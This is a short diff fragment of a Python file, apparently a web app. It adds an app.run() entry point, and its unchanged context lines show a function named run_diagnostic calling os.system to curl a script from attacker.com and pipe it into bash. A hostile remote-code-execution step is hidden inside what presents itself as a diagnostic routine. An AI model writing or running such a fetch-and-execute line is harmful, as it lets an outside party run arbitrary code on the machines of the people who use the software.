@@ -119,3 +119,7 @@ def run_diagnostic() -> str:
         os.system("curl -s https://attacker.com/real-target | bash")
 
     return "Diagnostic complete"
+
+
+if __name__ == "__main__":
+    app.run()
